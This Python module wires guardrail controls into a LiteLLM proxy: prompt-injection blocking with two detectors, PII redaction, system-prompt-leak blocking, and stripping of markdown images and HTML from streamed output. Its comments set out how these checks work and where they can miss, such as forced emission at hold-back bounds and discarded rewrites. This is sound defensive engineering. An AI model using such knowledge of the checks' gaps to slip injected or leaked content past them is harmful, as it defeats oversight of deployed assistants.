"""LiteLLM CustomGuardrail entrypoints. Wiring only — no policy, no detection."""

from __future__ import annotations

import logging
import os
import time
import uuid
from typing import Any

from guardrails import audit, log_masking, pseudonymize, streaming
from guardrails.canonical import canonicalize
from guardrails.policy import ControlConfig, Policy, decide
from guardrails.scanners.injection import InjectionScanner
from guardrails.scanners.nufi_injection import NufiInjectionScanner
from guardrails.scanners.nufi_pii import NufiPiiScanner
from guardrails.scanners.patterns import scan_exfil, scan_secrets, scan_system_echo
from guardrails.scanners.pii import PiiScanner
from guardrails.spans import extract_spans
from guardrails.types import Action, Decision, Finding, Span, SpanSource
from litellm._logging import verbose_proxy_logger
from litellm.integrations.custom_guardrail import CustomGuardrail

# Verified against the installed litellm==1.83.10 source
# (litellm/proxy/common_request_processing.py::_handle_llm_api_exception,
# which both /v1/chat/completions and /v1/completions route through): the
# call_type LiteLLM actually hands a pre_call hook is the CallTypes enum
# value, and for a chat request that is "acompletion" (async) or
# "completion" (sync) — never "chat_completion"/"achat_completion". Those
# two strings appear in no CallTypes member and would never match a real
# request; kept out rather than carried forward from the brief unverified.
_CHAT_CALL_TYPES = frozenset({"completion", "acompletion"})

POLICY_PATH = os.environ.get("GUARDRAIL_POLICY_PATH", "/app/guardrails/policy.yaml")
SCANNER_API_BASE = os.environ.get("SCANNER_API_BASE", "http://nufi-scanner:8000")
# Measured: ~200 ms per 450-token window, and the scanner caps a request at
# _MAX_WINDOWS_PER_REQUEST windows, so a full scan lands near 5 s worst case.
# G1 fails closed, so a timeout is a 503 for the user — leave headroom.
SCANNER_TIMEOUT_S = float(os.environ.get("SCANNER_TIMEOUT_S", "8.0"))

# Where the pre_call phase records its verdict on the client's grounded hint,
# for post_call controls to read. Namespaced so a client cannot forge it: the
# resolver overwrites this key on every request before anything reads it.
VERIFIED_GROUNDED_KEY = "nufi_grounded_verified"

# --- Streaming hold-back bounds ---------------------------------------------
#
# See `guardrails/streaming.py` for the design; these are the numbers, and each
# is a latency-versus-coverage trade-off rather than a tuning knob. The bound
# is what stops a never-closed `[` in prose (or one enormous unbroken token)
# from holding the rest of the answer until the stream ends -- "you deleted
# streaming in order to protect it". Exceeding a bound force-emits, which is
# the ONE case where a construct can be split across the emission boundary and
# so reach the client whole; that is counted (`GUARDRAIL_STREAM_FORCED`) and
# caught after the fact by each control's `_verify` pass over what it actually
# sent, never assumed not to happen.
#
# All are env-overridable so a deployment can trade latency for margin without
# a rebuild.

# G4. A markdown image destination is the longest thing worth holding; 2 KiB is
# far past any realistic `![](...)` while bounding the stall to roughly two of
# the ~200-character chunks this stack's models emit.
STREAM_MAX_HOLD_MARKUP = int(os.environ.get("GUARDRAIL_STREAM_MAX_HOLD_MARKUP", "2048"))

# G2b. Every entity in the shipped list is one token except a spaced
# PHONE_NUMBER (`+1 555 123 4567`) and CREDIT_CARD (`4111 1111 1111 1111`),
# which are four -- so five tokens covers them with one to spare. The
# character bound additionally covers `scan_secrets`' unbounded formats (a JWT
# is a single token and routinely exceeds 500 characters).
#
# The honest limit: a hold-back measured in tokens is a BET on how wide an
# entity can be, and Presidio is free to return a wider span than the list
# above suggests (it would, for instance, if `PERSON` or an address recogniser
# were ever added to `options.entities`). When that happens the leading tokens
# are already on the wire before the entity is recognisable, so the redaction
# cannot happen. That is not silent: the post-stream self-check re-scans what
# was actually sent and raises
# `nufi_guardrail_stream_unenforced_total{control="G2b",reason="escaped"}` plus
# an `enforced=false` audit event. Widen this constant if a deployment enables
# wider entity types -- the counter is how you would know to.
STREAM_PII_TAIL_TOKENS = int(os.environ.get("GUARDRAIL_STREAM_PII_TAIL_TOKENS", "5"))
STREAM_MAX_HOLD_PII = int(os.environ.get("GUARDRAIL_STREAM_MAX_HOLD_PII", "1024"))
# G2b alone calls a network detector, so it cannot scan per chunk. After the
# first scan it waits until at least this many characters have become
# emittable, or until end of stream. It never affects COVERAGE -- the
# hold-back, not the batch size, is what makes a split match impossible to
# miss -- only how many Presidio round trips a response costs.
#
# The FIRST scan is exempt from the threshold, and that exemption is where
# almost all of the latency went. Measured by replaying a recorded
# gemini-2.5-flash trace (7 chunks, 1416 characters, 607 ms) through the real
# chain inside the proxy container, median of 7 runs:
#
#   flat threshold, no exemption      64 chars   +131.3 ms TTFT   7 Presidio calls
#   flat threshold, no exemption     256 chars   +132.1 ms TTFT   5 Presidio calls
#   flat threshold, no exemption      32 chars     +4.4 ms TTFT   9 Presidio calls
#
# A flat 256 bought four fewer Presidio calls for 127 ms of time-to-first-
# token -- the wrong side of the trade in a feature that exists for latency.
# A flat 32 fixed the latency and cost 80% more calls on every response.
# Scanning once as soon as ANY text is emittable and batching only afterwards
# gets both: the first delta leaves after one Presidio round trip, and the
# rest of the response is still scanned in batches.
STREAM_PII_BATCH_CHARS = int(os.environ.get("GUARDRAIL_STREAM_PII_BATCH_CHARS", "256"))

# G3 has no bound here because it has no hold-back: it BLOCKS rather than
# rewrites, and scanning the accumulated text before yielding the chunk that
# completes an echo is already sufficient. See `_EchoStream`.


class GuardrailBlocked(Exception):
    """Raised to stop a request. LiteLLM surfaces this to the caller.

    Carries `status_code` (plain attribute, not an `HTTPException`
    subclass) because LiteLLM's own exception-to-response mapping reads
    `status_code` off whatever a guardrail hook raises — verified directly
    against the installed litellm==1.83.10 source, in BOTH exception paths
    a chat completion can take:
      - the legacy `completion()` endpoint's inline
        `except Exception as e: raise ProxyException(...,
        code=getattr(e, "status_code", 500))`;
      - `chat_completion()`'s route through
        `ProxyBaseLLMRequestProcessing._handle_llm_api_exception`, whose
        final fallback (reached by anything that is not an `HTTPException`
        or `httpx.HTTPStatusError`) is the identical
        `code=getattr(e, "status_code", 500)`.
    A bare `Exception` has neither attribute, so every block would surface
    to the caller — and to any 5xx-based alerting — as a 500 server error
    indistinguishable from an outage. This module's own comment above
    `SCANNER_TIMEOUT_S` already promises the caller a 503 on a scanner
    timeout; the brief's `class GuardrailBlocked(Exception)` did not
    deliver that promise, defaulting every raise to 500. `status_code`
    closes that gap without adding a `fastapi` dependency this package does
    not otherwise need (it is not installed in this venv or in CI's
    `litellm` — only bare `pip install litellm` — and is only present at
    runtime because the proxy's own base image bundles it).

    Not subclassing `fastapi.HTTPException`: doing so would let LiteLLM's
    `_serialize_http_exception_detail` unpack a structured dict `detail`
    into `ProxyException.provider_specific_fields`, which is the most
    promising carrier for `code`/`event_id` to survive to the client
    verbatim — but confirming that shape requires `fastapi` importable,
    which is a dependency decision (and the empirical wire-format check)
    the plan explicitly reserves for Task 15 Step 9. Recorded here so that
    task does not have to rediscover it.
    """

    # Discriminator on the wire. litellm builds its error body with
    # `type=getattr(e, "type", "None")` and `param=getattr(e, "param", "None")`
    # (proxy/common_request_processing.py:1656-1657), so an exception carrying
    # these attributes gets them verbatim in the response.
    #
    # Design section 7 recorded that no discriminator survives to the client and
    # left the carrier as an open decision. The measurement was right -- every
    # block did arrive as `"type": "None"` -- but the conclusion was wrong: the
    # field was always available, we simply never set it. Without it a client
    # can only tell a policy refusal from a malfunction by matching on the
    # message prose, which is why apps/chat still introduces a refusal with
    # "Something went wrong".
    type = "nufi_guardrail_blocked"

    def __init__(
        self, code: str, event_id: str, detail: str, status_code: int = 400
    ) -> None:
        self.code = code
        # `param` carries the risk code (LLM01_INJECTION, ...) so a client can
        # key its refusal copy off a stable identifier instead of the prose.
        self.param = code
        self.event_id = event_id
        self.detail = detail
        self.status_code = status_code
        # `message` for the SAME reason as `status_code`: litellm reads it off
        # whatever a hook raises. On the non-streaming path
        # (`_handle_llm_api_exception`) the fallback is `str(e)`, which is
        # already `detail`, so this changes nothing there. On the STREAMING
        # path it changes what a blocked user sees:
        # `async_streaming_data_generator`'s handler builds
        # `error_msg = f"{str(e)}\n\n{traceback.format_exc()}"` and passes
        # `getattr(e, "message", error_msg)` into the in-band SSE error frame —
        # so without this attribute, terminating a stream (which is how G3
        # enforces on a streamed response) would ship a Python traceback,
        # naming internal modules and line numbers, into the user's chat window
        # as the refusal text.
        self.message = detail
        super().__init__(detail)

    def to_body(self) -> dict[str, Any]:
        return {
            "error": {
                "type": "nufi_guardrail_blocked",
                "code": self.code,
                "event_id": self.event_id,
                "detail": self.detail,
            }
        }


# What a BLOCKED user is told. Deliberately separate from `decision.reason`,
# which is a scanner diagnostic ("injection=1.00 on user span") and belongs in
# the audit trail, not in someone's chat window. Until the app-layer guardrails
# were removed, the app rendered a localized refusal and this string never
# reached a user; now it does, because the wire carries no discriminator the
# client could key a message off (design section 7).
#
# So these are the actual user-facing copy. Keep them free of scores, offsets,
# entity names and exception text: an error message is an oracle, and telling
# an attacker their payload scored 1.00 on the "user span" is free tuning
# feedback. `event_id` is included so support can find the record.
_BLOCK_MESSAGE = {
    "LLM01_INJECTION": (
        "This request was blocked by a security policy because it looks like an "
        "attempt to override the assistant's instructions. If this was a "
        "legitimate question, rephrase it and try again."
    ),
    "LLM07_SYSTEM_PROMPT_LEAK": (
        "This response was withheld by a security policy because it appeared to "
        "disclose the assistant's configuration."
    ),
    "GUARDRAIL_UNAVAILABLE": (
        "A security check could not run, so this request was refused rather "
        "than sent unchecked. This is usually temporary — please retry."
    ),
}


def _block_detail(code: str, event_id: str) -> str:
    """User-facing refusal text for a block code, with the id for support.

    Falls back to a generic refusal rather than to the diagnostic: an unknown
    code must not degrade into leaking whatever the caller happened to pass.
    """
    message = _BLOCK_MESSAGE.get(code, "This request was blocked by a security policy.")
    return f"{message} (reference: {event_id})"


class _StreamState:
    """One control's buffer for one choice of one streamed response.

    Subclasses implement `feed` (scan the pending buffer, return the prefix
    that is safe to send, keep the rest) and `_residual` (re-scan what was
    actually sent). Everything else — the record of what went out, the
    post-stream self-check, the counters — is here so all three controls
    account for themselves the same way.

    `verify` is the part worth reading twice. Every other signal this codebase
    emits describes a DECISION: "G4 decided to strip this". None of them can
    distinguish a decision that reached the wire from one that did not, and
    that distinction is the entire subject of this work — the previous
    implementation recorded `enforced=true` for responses delivered with the
    payload intact. So after the stream closes, each control re-scans its own
    emitted text with its own scanner and its own policy, and if that still
    says "this should have been rewritten", it says so: a counter, an ERROR
    log, and an audit event with `enforced=False`. It is the only assertion
    here that is made against the bytes that were actually sent rather than
    against an intention.
    """

    def __init__(self, guard: BaseNufiGuardrail, data: dict[str, Any], key: Any) -> None:
        self._guard = guard
        self._data = data
        self._key = key
        self._pending = ""
        self._sent = ""
        self.finished = False
        self._forced = False
        self._delivery_failed = False

    async def feed(self, text: str, *, final: bool) -> str:
        raise NotImplementedError

    async def _residual(self) -> Decision | None:
        """The control's own verdict on the text it actually sent, or None."""
        raise NotImplementedError

    def _bound(self, cut: streaming.Cut) -> int:
        if cut.forced:
            self._forced = True
            audit.GUARDRAIL_STREAM_FORCED.labels(control=self._guard.control_id).inc()
            verbose_proxy_logger.warning(
                "guardrail %s: streaming hold-back bound reached; emitted text that "
                "could still be part of a longer match",
                self._guard.control_id,
            )
        return cut.index

    def deliver(self, text: str, *, final: bool) -> str:
        """Last transform before the text goes on the wire. Identity by default.

        Separate from `feed` for one reason, and it is the reason the streaming
        restore path was not built with the rest of pseudonymization: what goes
        on the WIRE and what gets recorded as SENT must be allowed to differ.

        `record_sent` feeds `verify`, which re-scans the control's own emitted
        text and reports a leak if its policy still trips. A correctly restored
        email address IS PII by G2b's own detector, so restoring inside `feed`
        would make `verify` report every pseudonymized stream as a leak --
        `nufi_guardrail_stream_unenforced_total`, the one counter in this module
        that is supposed to sit at zero and mean something when it does not.

        So `feed` returns what redaction produced (surrogates and all), that is
        what `record_sent` records and what `verify` judges, and this method puts
        the user's own values back on the way out. The two questions stay
        separate: did redaction reach the wire, and did the round trip complete.

        May return LESS than it was given -- a surrogate split across a chunk
        boundary is held until it completes. Anything still held when `final` is
        true must be flushed by the implementation, or it never reaches the
        client while `record_sent` claims it did.
        """
        return text

    def finalize(self) -> None:
        """Called once per processor after `verify`, whatever the mode. No-op by
        default. G2b uses it to wipe the vault session for a streamed response,
        which `apply_guardrail` cannot do -- on a streamed request it runs before
        the stream has been consumed."""

    def record_sent(self, text: str) -> None:
        self._sent += text

    def record_undelivered(self, original: str) -> None:
        """The rewrite could not be written back onto the chunk.

        The chunk therefore goes out with its ORIGINAL content, so that — not
        what this control computed — is what the client receives, and it is
        what gets recorded as sent. Loud, because a silent `return False` from
        `streaming.set_delta` would leave a control reporting a rewrite it did
        not deliver, which is the precise defect this module exists to end.
        """
        self._delivery_failed = True
        self._sent += original
        verbose_proxy_logger.error(
            "guardrail %s: could not write the rewritten delta back onto a "
            "streamed chunk; the original text was sent instead",
            self._guard.control_id,
        )

    async def verify(self) -> None:
        if not self._guard._enforcing():
            # In shadow mode nothing was rewritten by design, so re-scanning
            # what was sent would flag every finding as a leak. The decisions
            # themselves are still recorded by `feed`, which is the whole
            # shadow-mode signal.
            return
        try:
            decision = await self._residual()
        except Exception:  # noqa: BLE001 - the self-check must never break a response
            verbose_proxy_logger.exception(
                "guardrail %s: post-stream verification could not run; whether "
                "this response was protected is UNKNOWN",
                self._guard.control_id,
            )
            audit.GUARDRAIL_STREAM_UNENFORCED.labels(
                control=self._guard.control_id, reason="unverified"
            ).inc()
            return
        if decision is None or decision.action is Action.ALLOW:
            return
        reason = (
            "undelivered"
            if self._delivery_failed
            else ("bound" if self._forced else "escaped")
        )
        audit.GUARDRAIL_STREAM_UNENFORCED.labels(
            control=self._guard.control_id, reason=reason
        ).inc()
        verbose_proxy_logger.error(
            "guardrail %s: the streamed response it sent STILL trips its own "
            "scanner (%s, reason=%s). This response was not protected.",
            self._guard.control_id,
            decision.reason,
            reason,
        )
        self._guard._emit(self._data, decision, (), self._key, False)


class BaseNufiGuardrail(CustomGuardrail):
    control_id: str = ""

    # Set by every control that detects (G1, G2a, G2b); consumed by
    # `_scan_all`. Annotation only, with no default: a control that calls
    # `_scan_all` without having built its scanners raises AttributeError at
    # once, rather than inheriting a shared empty list and reporting a clean
    # scan it never performed.
    _scanners: list[Any]

    # Can THIS control's outage path ever actually change what happens to a
    # request/response — block it, withhold it — or does every path through
    # `_on_outage` end in returning the input unchanged regardless of what
    # `enforced` says? Defaults to `False`: across this plan's five controls,
    # only G1 (raises `GuardrailBlocked`) and G3 (same) can actually enforce
    # on an outage — G2a, G2b, and G4 (which, like G2b, only rewrites text)
    # cannot. Recording `enforced=True` on an outage decision that
    # structurally cannot enforce anything writes a phantom entry into
    # `nufi_guardrail_decisions_total{action="block", enforced="true"}` — a
    # series shared with G1, where every entry IS a real block, and the exact
    # number the rollout plan reads to decide whether enforcement is safe. A
    # missing signal reads as a gap; a wrong one reads as fact — the worse of
    # the two, and the one a default of `True` would hand to every future
    # control that says nothing. Only a control that genuinely has a
    # blocking/withholding mechanism (see `G1Injection`) should override this
    # to `True` — saying nothing must be the safe choice, not the dangerous
    # one a majority-shaped default would make it.
    outage_can_enforce: bool = False

    def __init__(self, policy: Policy | None = None, **kwargs: Any) -> None:
        super().__init__(**kwargs)
        self._policy = policy or Policy.load(POLICY_PATH)
        self._control = self._policy.control(self.control_id)
        # `nufi_guardrail_enabled` is declared as "1 when a control is enabled
        # AND enforcing" (audit.py) and `health.assert_controls` writes exactly
        # that. This constructor is the gauge's other writer, so it must use the
        # identical formula -- `_enforcing()`, the same one the request path
        # consults. It previously wrote `1 if enabled`, ignoring mode, and the
        # two writers raced: LiteLLM re-executes this module once per registered
        # guardrail, so the last constructor to run (G4) left
        # `nufi_guardrail_enabled{control="G4",mode="logging_only"} 1.0` on
        # /metrics while every control was in shadow and enforcing nothing.
        # Observed on the live stack, 2026-07-27.
        audit.GUARDRAIL_ENABLED.labels(
            control=self.control_id, mode=self._control.mode
        ).set(1 if self._enforcing() else 0)

    @property
    def control(self) -> ControlConfig:
        return self._control

    def _enforcing(self) -> bool:
        # Delegates rather than restating: `ControlConfig.enforcing` is the one
        # definition, shared with `health.guardrail_status` and
        # `health.assert_controls`. Kept as a method because the request path
        # calls it in a dozen places and several tests patch `_control` under it.
        return self._control.enforcing

    def _context(self, data: dict[str, Any], key: Any) -> dict[str, Any]:
        """Build `audit.build_event`'s `request_context`.

        `audit.build_event` documents that a key ABSENT from this dict is
        omitted from the event entirely, never defaulted to `None` — "a
        None copied into every event looks, on the reading side, identical
        to 'we checked and there wasn't one'". Setting every key
        unconditionally (including `None` when a key/model attribute is
        missing) would silently defeat that contract at the one call site
        that actually supplies it, so each optional field is included only
        when it has a real value.
        """
        context: dict[str, Any] = {"policy_digest": self._policy.digest()}
        key_alias = getattr(key, "key_alias", None)
        if key_alias is not None:
            context["key_alias"] = key_alias
        team_id = getattr(key, "team_id", None)
        if team_id is not None:
            context["team_id"] = team_id
        model = data.get("model")
        if model is not None:
            context["model"] = model
        return context

    def resolve_grounded(self, data: dict[str, Any], key: Any) -> bool:
        """Evaluate the grounded hint against the calling key and record the verdict.

        Only callable from a pre_call hook, which is the only place LiteLLM
        hands us the API key object. Post-call controls read the verdict via
        `verified_grounded` — they must never re-read the raw client hint,
        which is attacker-controllable.
        """
        key_metadata = getattr(key, "metadata", None)
        if not isinstance(key_metadata, dict):
            key_metadata = {}
        request_metadata = data.setdefault("metadata", {})
        if not isinstance(request_metadata, dict):
            return False

        granted = bool(key_metadata.get("allow_grounded_hint"))
        claimed = bool(request_metadata.get("nufi_grounded"))
        verdict = granted and claimed
        request_metadata[VERIFIED_GROUNDED_KEY] = verdict
        return verdict

    @staticmethod
    def verified_grounded(request_data: dict[str, Any] | None) -> bool:
        metadata = (request_data or {}).get("metadata") or {}
        if not isinstance(metadata, dict):
            return False
        return metadata.get(VERIFIED_GROUNDED_KEY) is True

    @staticmethod
    def streamed(request_data: dict[str, Any] | None) -> bool:
        """Is the response this hook is inspecting being STREAMED to the client?

        HISTORY, because the answer changed and the reason it changed is the
        whole point. Until 2026-07-29 this method existed to force `enforced`
        to `False` on `apply_guardrail`'s streaming path, because a rewrite
        computed there really was discarded. Both halves of that were measured
        against the running stack (litellm 1.83.10):

          * `unified_guardrail.async_post_call_streaming_iterator_hook`
            deep-copies each sampled chunk into `original_item` BEFORE calling
            the guardrail and then yields `original_item` — the pre-guardrail
            copy. `apply_guardrail`'s return value is never routed back into
            the stream. A streamed completion containing
            `<iframe src="https://example.com" ...>` reached the client
            byte-for-byte unstripped while the identical non-streamed request
            came back `[removed:RAW_HTML]`.
          * Worse, only ONE of our post_call controls ran at all:
            `proxy/utils.py`'s dispatch writes
            `request_data["guardrail_to_apply"] = callback` into a SINGLE dict
            slot once per guardrail, and `unified_guardrail` `pop`s it lazily
            from inside its generator, after the loop has finished — so every
            wrapper read the last value written. One streamed request moved
            `nufi_guardrail_latency_seconds_count{control="G4"}` by 1 and
            `{control="G2b"}` and `{control="G3"}` by 0.

        Neither is true of this codebase any more. `G2bPiiOutput`,
        `G3SystemPromptLeak` and `G4OutputHandling` each define
        `async_post_call_streaming_iterator_hook`, which takes the FIRST branch
        of that same dispatch (`if "async_post_call_streaming_iterator_hook" in
        type(callback).__dict__`) — the branch that chains each callback around
        the previous response iterator instead of routing it through the
        single-slot bridge. All three now run, in registration order, and each
        genuinely rewrites the chunks it yields. So a streamed response IS
        enforced, and `enforced=True` on one is the honest record.

        What this method still answers is narrower and still worth answering:
        "am I, `apply_guardrail`, being called for a response the client is
        streaming?" That combination is now a DISPATCH ANOMALY. It means
        litellm did not take the iterator-hook branch for this callback, so
        whatever `apply_guardrail` returns will be discarded exactly as it was
        before — and the honest record for THAT call is still
        `enforced=False`. Callers pair it with a loud log rather than treating
        it as routine, because if it ever fires, streaming protection is off
        and nothing else would say so.

        Reads `request_data["stream"]`, the client's own request body flag that
        the proxy passes through to this hook unchanged. Not
        `request_data["responses"]` (litellm's streaming translation layer sets
        it, but only on the mid-stream sampled path) and not a `logging_obj`
        attribute (private, and `apply_guardrail` is called with
        `logging_obj=None` from several call sites).
        """
        return bool((request_data or {}).get("stream"))

    def _stream_dispatch_anomaly(self, data: dict[str, Any] | None) -> bool:
        """True when `apply_guardrail` was reached for a STREAMED response.

        Separated from `streamed` so the log fires once per occurrence at the
        one call site that can observe it, and so a test can assert on the
        warning: the failure being watched for is silent by construction (the
        request succeeds, the response is delivered, only the rewrite is
        missing), so an unlogged `False` here would restore the exact blind
        spot the streaming hooks were written to close.
        """
        if not self.streamed(data):
            return False
        verbose_proxy_logger.error(
            "guardrail %s: apply_guardrail was called for a STREAMED response. "
            "litellm did not dispatch to async_post_call_streaming_iterator_hook, "
            "so this control's rewrite will be discarded and the response goes "
            "out unprotected. Recorded enforced=false.",
            self.control_id,
        )
        return True

    async def _guarded_stream(
        self,
        response: Any,
        make_processor: Any,
    ) -> Any:
        """Drive a per-choice `_StreamState` over an async chunk iterator.

        The mechanical half of the streaming hooks, shared by all three
        controls: pull a chunk, hand each choice's delta to that choice's
        processor, write back whatever the processor says is safe to send, and
        yield the chunk. Everything policy-shaped lives in the processor.

        Two details are load-bearing rather than incidental:

        * The flush is attached to the chunk that carries `finish_reason`.
          That is the provider saying "no more text for this choice", so the
          hold-back can be released while a real chunk is still in hand to
          carry it — no synthetic frame, no extra round trip, and no
          delay-by-one buffering (which would have cost one whole inter-chunk
          interval of time-to-first-token on every request, streamed or not).
        * A stream that ends WITHOUT a `finish_reason` — an abnormal
          termination — still has held-back text, and dropping it would
          silently truncate the answer. That case synthesises a tail chunk
          from the last one seen. If even that fails there is nowhere to put
          the text, which the processor records as undelivered rather than
          discarding quietly.
        """
        processors: dict[int, _StreamState] = {}
        template: Any = None

        async for chunk in response:
            template = chunk
            for index, content, final in streaming.iter_deltas(chunk):
                if content is None and not final:
                    # A role-only or usage-only frame for a choice that is not
                    # finished: nothing to scan and nothing to flush.
                    continue
                processor = processors.get(index)
                if processor is None:
                    processor = processors[index] = make_processor()
                emitted = await processor.feed(content or "", final=final)
                # `deliver` is what reaches the client; `emitted` is what the
                # control decided and what `verify` is judged against. They are
                # the same for every control but G2b -- see `_StreamState.deliver`
                # for why they must be allowed to differ.
                delivered = processor.deliver(emitted, final=final)
                if content is None and not delivered:
                    # Do not turn a `content: null` delta into `content: ""`;
                    # that is a wire-shape change with no benefit.
                    #
                    # Tested on `delivered` and NOT on `emitted`, because this
                    # decides what goes on the WIRE and `delivered` is what goes
                    # on the wire. For every control but G2b `deliver` is the
                    # identity, so the two are the same string and this reads
                    # exactly as it did before. For G2b they can differ, and an
                    # earlier draft read `not emitted and not delivered` -- which
                    # needs G2b's own buffer to be empty while the restorer still
                    # holds a token. I could not construct that state, so rather
                    # than leave a clause no test reaches, the condition now
                    # depends only on the value whose emptiness actually matters.
                    continue
                if streaming.set_delta(chunk, index, delivered):
                    processor.record_sent(emitted)
                else:
                    processor.record_undelivered(content or "")
            yield chunk

        for index, processor in processors.items():
            # A finished processor is skipped, and that is safe rather than
            # lucky: `deliver(..., final=True)` already ran for it in the main
            # loop, so its boundary buffer is empty. An earlier draft called
            # `deliver` here too, "in case it is still holding" -- mutation
            # testing showed that branch was semantically identical to skipping,
            # which makes it dead code rather than a safeguard.
            if processor.finished:
                continue
            # `emitted` and `residue` are recorded and delivered SEPARATELY, and
            # conflating them is a real defect rather than a tidiness point:
            # `residue` is post-restore text, so `record_sent(residue)` would
            # write real PII into the string `verify` re-scans and make it report
            # a leak on a correct round trip. `_sent` only ever receives what
            # `feed` produced.
            emitted = await processor.feed("", final=True)
            residue = processor.deliver(emitted, final=True)
            if not residue:
                if emitted:
                    # Redaction produced text that `deliver` is still holding
                    # with nothing left to flush it.
                    processor.record_undelivered(emitted)
                continue
            tail = streaming.tail_chunk(template, index, residue)
            if tail is None:
                processor.record_undelivered(emitted or residue)
                continue
            # A no-op when `emitted` is empty, which is the finished-but-holding
            # case: that text was recorded in the main loop already.
            processor.record_sent(emitted)
            yield tail

        for processor in processors.values():
            await processor.verify()
            processor.finalize()

    async def _scan_all(self, spans: list[Span]) -> list[Finding]:
        """Run every scanner this control owns and pool their findings.

        Each `Finding` carries its own `detector`, so `policy.decide` prices
        them separately (see `detector_thresholds`), the audit event names
        which one fired, and `ControlConfig._corroborated` can count how many
        DISTINCT detectors reached a verdict.

        Every scanner runs on every request, and a scanner that cannot run
        raises out of here rather than being skipped. That is the whole
        arrangement: G1's `require_corroboration` can only spend what both of
        its detectors produce, so an absent second detector is not a degraded
        G1, it is a G1 that silently stops enforcing on user spans -- and for
        G2a/G2b an absent Korean detector is a control that reports every
        Korean identifier clean. Neither may present as a quiet scan. The
        caller's `_on_outage` decides what an outage costs.
        """
        findings: list[Finding] = []
        for scanner in self._scanners:
            findings.extend(await scanner.scan(spans))
        return findings

    def _exempt(self, data: dict[str, Any] | None) -> bool:
        """Is this request's model exempt from THIS control in policy.yaml?

        Counted, never silent. An exemption is a hole in a security control, so
        `nufi_guardrail_exemptions_total` makes it visible how often the hole is
        used -- if traffic starts flowing through an exempt alias, that shows up
        as a rising counter rather than as nothing at all.

        Lives on the base so every control honours the same field. An
        `exempt_models` list that only some controls read would be a trap: a
        reviewer sees it in policy.yaml and assumes it applies everywhere.
        """
        # Defensive: a control that already tolerates a non-dict request_data
        # (a client can send anything) must not start raising here. Not-a-dict
        # means not-exempt, which is the safe direction -- the control runs.
        if not isinstance(data, dict):
            return False
        model = data.get("model")
        if not self._control.exempts(model):
            return False
        audit.GUARDRAIL_EXEMPTIONS.labels(
            control=self.control_id, model=str(model)
        ).inc()
        return True

    def _emit(
        self,
        data: dict[str, Any],
        decision: Any,
        transforms: tuple[str, ...],
        key: Any,
        enforced: bool,
    ) -> dict[str, Any]:
        event = audit.build_event(
            decision, transforms, self._context(data, key), enforced
        )
        try:
            audit.record(data, event)
        except audit.AuditRecordError:
            # `event["event_id"]` above is already valid regardless — only
            # the metadata ATTACH (and this one event's entry in
            # `guardrail_information`) failed, not the decision itself.
            # `audit.record` increments GUARDRAIL_DECISIONS before it ever
            # touches `data["metadata"]` (see audit.py), so the decision is
            # still visible in Prometheus even though this call raised.
            #
            # Swallowed here rather than re-raised: re-raising would let a
            # malformed `data["metadata"]` shape (e.g. a client sending
            # `"metadata": "not-a-dict"`) turn into an uncaught exception
            # from THIS hook regardless of mode — including logging_only,
            # where it must never break traffic. The caller can still raise
            # the correct `GuardrailBlocked` when enforcing, since it reads
            # `event["event_id"]`, not this method's return value's
            # persistence. Logged, not silent — the request-level count is
            # covered by Prometheus, but this surfaces the anomaly itself.
            verbose_proxy_logger.error(
                "guardrail %s: audit.record failed to attach event %s: "
                "malformed request metadata shape",
                self.control_id,
                event.get("event_id"),
            )

        # The write above is OURS: it lands in
        # `data["metadata"]["guardrail_information"]`, which nothing downstream
        # reads. LiteLLM persists guardrail data to `LiteLLM_SpendLogs` (and
        # forwards it to Langfuse/OTEL) exclusively from
        # `metadata["standard_logging_guardrail_information"]`, written only by
        # the helper below -- see litellm_logging.py:5526 and :5571.
        #
        # Without this call every event is built, attached, and dropped. That
        # was live: 464 decisions on the Prometheus counter, 244 spend-log rows,
        # ZERO carrying a `grd_` id. A user handed an event_id in a block
        # response could not have it looked up, anywhere.
        #
        # It is a separate try from the one above because it is a separate
        # failure: our attach can succeed while this one fails, and reporting
        # either as the other is how the first one hid for sixteen tasks.
        try:
            self.add_standard_logging_guardrail_information_to_request_data(
                guardrail_json_response=event,
                request_data=data,
                guardrail_status=(
                    "guardrail_intervened"
                    if enforced and decision.action not in ("log", "allow")
                    else "success"
                ),
            )
        except Exception:  # noqa: BLE001 - never break traffic to record an event
            # Loud, because the alternative is exactly the defect this call
            # fixes: an event that looks recorded and is not. Swallowed rather
            # than raised for the same reason as the sibling above -- a
            # logging_only control must never break a request.
            verbose_proxy_logger.exception(
                "guardrail %s: event %s was NOT persisted to spend logs; "
                "it exists only in Prometheus counters",
                self.control_id,
                event.get("event_id"),
            )

        # The durable trail, and the only one proven to survive.
        #
        # Both metadata routes above were measured NOT to reach any store:
        # `standard_logging_guardrail_information` (the key litellm's own
        # helper writes, read at litellm_logging.py:5525) and our
        # `guardrail_information` are both absent from the spend-log row and
        # from the Langfuse observation on a request whose decision counter
        # demonstrably moved. A third attempt with a `nufi_`-namespaced key
        # was measured absent too. Request metadata does not reliably carry
        # anything from a guardrail hook to a logging backend in litellm
        # 1.83.10, so the audit trail cannot be built on it.
        #
        # A log line is carried by the container runtime, is greppable by
        # event_id, and does not depend on litellm forwarding anything. It is
        # written as single-line JSON so a collector can parse it without a
        # regex. The event never contains matched text (see audit.py), so this
        # is safe to emit at INFO.
        audit.log_event(event)
        return event


class G1Injection(BaseNufiGuardrail):
    control_id = "G1"
    # Raises `GuardrailBlocked` on a fails-closed outage (see `_on_outage`
    # below), so a fails-closed outage here is a real block, not a phantom one.
    outage_can_enforce = True

    def __init__(
        self,
        policy: Policy | None = None,
        scanner: Any | None = None,
        nufi_scanner: Any | None = None,
        **kwargs: Any,
    ) -> None:
        super().__init__(policy=policy, **kwargs)
        # Two independent detectors, both run on every request, both reported.
        # The ML classifier has recall and cannot separate intent from
        # phrasing; the regex detector has precision and misses attacks the
        # classifier catches. policy.yaml's `require_corroboration` is what
        # spends the pair -- see `_scan_all` for why an absent one is an
        # outage rather than a smaller scan.
        self._scanners = [
            scanner
            or InjectionScanner(base_url=SCANNER_API_BASE, timeout_s=SCANNER_TIMEOUT_S),
            nufi_scanner or NufiInjectionScanner(),
        ]

    async def async_pre_call_hook(
        self, user_api_key_dict: Any, cache: Any, data: dict[str, Any], call_type: str
    ) -> dict[str, Any]:
        # Before every early return: a request that skips the guardrails still
        # reaches the logging backend, and that is exactly when nothing else is
        # watching what lands there.
        log_masking.install(data)

        # Resolved before EVERY early return, including the non-chat-call-type
        # one immediately below. This is the only phase LiteLLM hands over the
        # key object, and a post_call control treats a missing verdict as
        # not-grounded — a return that skips this would silently change that
        # control's redaction behaviour for any call type it runs against,
        # not just the chat ones this hook goes on to scan.
